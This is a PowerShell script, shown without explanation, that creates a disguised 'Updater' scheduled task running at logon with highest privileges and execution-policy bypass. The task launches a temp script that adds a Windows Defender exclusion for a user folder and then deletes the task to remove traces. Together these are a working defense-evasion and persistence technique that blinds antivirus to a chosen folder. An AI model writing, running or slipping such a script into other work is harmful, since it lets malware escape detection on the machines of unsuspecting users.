# Define a log file path
$logPath = "C:\Windows\Temp\updater_log.txt"

function Write-Log {
    param ($msg)
    $ts = "[{0}] $msg" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
    $ts | Out-File -FilePath $logPath -Append -Encoding utf8
}

Write-Log "\uD83D\uDD52 Boot-time script executed. Preparing 1-minute delayed task..."

# Task Name
$taskName = "UpdaterUACDelayed"

# Clean up old task if any
schtasks /Delete /TN $taskName /F | Out-Null

# Path to temporary elevated script
$tempScriptPath = "$env:TEMP\exclusion_elevated.ps1"

# Elevated script content
$elevatedScript = @"
# Elevation logic
\$logPath = '$logPath'
function Write-Log {
    param (\$msg)
    \$ts = "[{0}] \$msg" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
    \$ts | Out-File -FilePath \$logPath -Append -Encoding utf8
}

Write-Log "\u26A1 Elevated exclusion script started as: \$(whoami)"

# Define folder to exclude
\$folder = "\$env:USERPROFILE\TestSafeFolder"
if (-not (Test-Path \$folder)) {
    New-Item -ItemType Directory -Force -Path \$folder | Out-Null
    Write-Log "Created folder: \$folder"
}

# Try adding exclusion
try {
    Add-MpPreference -ExclusionPath \$folder -ErrorAction Stop
    Write-Log "\u2705 Successfully added exclusion: \$folder"
} catch {
    Write-Log "\u274C Failed to add exclusion: \$folder. Error: \$_"
}

# Clean up task
schtasks /Delete /TN '$taskName' /F | Out-Null
Write-Log "\uD83D\uDDD1 Deleted scheduled task: $taskName"
"@

# Write temp elevated script to file
$elevatedScript | Out-File -FilePath $tempScriptPath -Encoding utf8

# Payload to run elevated script
$payload = "powershell.exe -ExecutionPolicy Bypass -File `"$tempScriptPath`""

# Create scheduled task with delay
schtasks /Create /TN $taskName `
    /TR $payload `
    /SC ONLOGON `
    /RL HIGHEST `
    /DELAY 0001:00 `
    /F | Out-Null

Write-Log "\u2705 Scheduled task '$taskName' created to run 1 minute after login."
